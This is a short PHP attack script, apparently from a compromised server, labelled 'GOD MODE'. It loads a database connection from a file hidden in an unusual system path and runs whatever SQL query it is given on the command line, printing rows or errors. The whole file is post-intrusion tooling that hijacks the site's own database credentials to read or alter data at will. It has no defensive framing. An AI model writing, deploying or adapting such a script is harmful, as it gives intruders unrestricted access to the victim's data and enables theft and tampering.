<?php
// GOD MODE - Arbitrary SQL Execution via Hijacked Connection
// Usage: php god_mode.php "SQL QUERY"

echo "[!] By: Colton Silva (chinawaterstealers).\n";

if ($argc < 2) {
    die("Usage: php god_mode.php \"<SQL_QUERY>\"\nExample: php god_mode.php \"UPDATE my_settings SET boots=1\"\n");
}

$sql = $argv[1];

// 1. Hijack Connection
require_once('/etc/bluetooth/bluetooth/vendor/mtdowling/cron-expression/src/Cron/conn.php');

if (!$link) {
    die("[-] Connection Failed.\n");
}

echo "[*] Executing: $sql\n";

// 2. Execute Query
$result = mysqli_query($link, $sql);

if ($result === true) {
    echo "[+] Success. Rows affected: " . mysqli_affected_rows($link) . "\n";
} elseif ($result === false) {
    echo "[-] Error: " . mysqli_error($link) . "\n";
} else {
    // Result Set (SELECT)
    echo "[+] Result Set:\n";
    while ($row = mysqli_fetch_assoc($result)) {
        print_r($row);
    }
}
?>
